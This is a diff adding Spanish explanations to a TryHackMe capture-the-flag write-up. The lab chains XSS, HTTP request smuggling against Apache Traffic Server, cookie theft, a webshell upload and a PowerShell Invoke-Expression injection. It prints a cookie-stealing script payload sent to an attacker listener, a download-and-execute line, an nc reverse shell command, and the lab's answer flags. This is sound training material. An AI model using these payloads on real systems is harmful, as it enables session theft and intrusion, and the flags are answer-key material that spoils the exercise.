@@ -17,11 +17,34 @@
 
 ### Task 1: Bandera de usuario
 
+**Explicación:** El acceso inicial se hace por SSH a `register@<Target>.250` con la contraseña `register`. Tras el reconocimiento (nmap: `22`, `80` Apache Traffic Server 7.1.1, `631` CUPS, `8002` Apache Hadoop), se detecta una búsqueda reflejada donde el XSS se evade cerrando el atributo: `"><script>alert('1');</script>`. El inversor clave es el **HTTP Request Smuggling CL.TE** de Apache Traffic Server 7.1.1: se inyecta una petición "colada" que hace que el admin que monitorea la página ejecute un XSS que roba su `PHPSESSID` (payload con una imagen hacia tu listener en `:8002`). Con la sesión se accede a `upload.php`, se sube un webshell PHP diminuto (extensión `.png`/`.php`), se recibe una reverse shell con `nc`, y de `auth.php` salen credenciales válidas.
+
+```bash
+ssh register@<IP>.250
+# payload de robo de cookie
+a"><script>document.write('<img src="http://<IP>:8002/test.gif?cookie=' + document.cookie + '" />');</script>
+```
+
+Como usuario "ubuntu" se obtenía la flag de user antes de saltar al entorno Windows:
+
+```text
+THM{ALL_THIS_ESCAPING_MAKES_ME_TIRED_AM_I_DONE?}
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | What is the user flag? | `THM{ALL_THIS_ESCAPING_MAKES_ME_TIRED_AM_I_DONE?}` |
 
 ### Task 2: Bandera de root
+
+**Explicación:** Una vez en el contenedor Linux se enumera (`.dockerenv`), se recuperan credenciales de `auth.php` y se entra por SSH como `ubuntu` (miembro de `sudo`), obteniendo root en el propio contenedor. El salto real es a la máquina Windows `banditcorp` vía PowerShell (`pwsh` en `.local`) con una `PSSession`. El PowerShell está restringido, pero `Get-ServicesApplication` usa `Invoke-Expression`, así que `-Filter '$(<comando>)'` ejecuta código arbitrario: se descarga `nc.exe` y se lanza una reverse shell hacia el host controlado, completando el escape y leyendo `root.txt`.
+
+```powershell
+# inyección en Invoke-Expression
+Get-ServicesApplication -Filter '$(iex (new-object net.webclient).downloadstring("http://<IP>/nc.exe"))'
+# o descargar nc.exe y lanzar reverse shell
+.\nc.exe <IP> 9001 -e cmd.exe
+```
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
